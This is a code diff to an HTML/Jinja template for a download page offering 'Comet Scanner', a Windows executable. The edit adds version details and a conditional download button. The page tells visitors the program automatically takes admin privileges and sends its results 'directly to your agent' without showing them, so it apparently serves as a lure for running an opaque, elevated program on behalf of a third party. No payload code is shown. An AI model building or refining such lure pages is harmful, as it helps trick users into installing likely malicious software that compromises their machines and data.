@@ -31,6 +31,7 @@ h1{font-family:'Syne',sans-serif;font-size:2.4rem;font-weight:800;text-align:cen
 .dl-desc{color:var(--fg2);font-size:13px;margin-bottom:24px;line-height:1.6;}
 .btn-dl{display:inline-flex;align-items:center;gap:10px;background:var(--blue);color:#fff;text-decoration:none;font-size:15px;font-weight:700;padding:14px 32px;border-radius:12px;border:none;cursor:pointer;transition:.2s;box-shadow:0 0 28px rgba(59,130,246,0.35);}
 .btn-dl:hover{background:var(--blue2);box-shadow:0 0 40px rgba(59,130,246,0.5);transform:translateY(-1px);}
+.btn-dl:disabled{opacity:.4;cursor:not-allowed;transform:none;box-shadow:none;}
 .tags{display:flex;justify-content:center;gap:16px;flex-wrap:wrap;margin-top:20px;}
 .tag{font-size:11px;color:var(--fg3);display:flex;align-items:center;gap:4px;}
 .tag b{color:var(--blue);}
@@ -62,11 +63,24 @@ h1{font-family:'Syne',sans-serif;font-size:2.4rem;font-weight:800;text-align:cen
   <div class="dl-card">
     <div class="dl-icon">🛡️</div>
     <div class="dl-name">Comet Scanner</div>
-    <div class="dl-desc">Latest version — Windows 10/11 64-bit. Automatically requests admin privileges.<br>Results are sent directly to your agent — you will not see them.</div>
-    <a href="/static/Comet.exe" class="btn-dl" download>
+    <div class="dl-desc">
+      Latest version — Windows 10/11 64-bit. Automatically requests admin privileges.<br>
+      Results are sent directly to your agent — you will not see them.
+      {% if version %}<br><span style="color:var(--fg3);font-size:11px">{{ version }}{% if file_size %} · {{ file_size }}{% endif %}{% if updated %} · Updated {{ updated }}{% endif %}</span>{% endif %}
+    </div>
+
+    {% if has_exe %}
+    <a href="/download/exe" class="btn-dl">
       <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
       Download Comet.exe
     </a>
+    {% else %}
+    <button class="btn-dl" disabled>
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      No file uploaded yet
+    </button>
+    {% endif %}
+
     <div class="tags">
       <div class="tag"><b>✓</b> Windows 10 / 11</div>
       <div class="tag"><b>✓</b> Auto admin elevation</div>
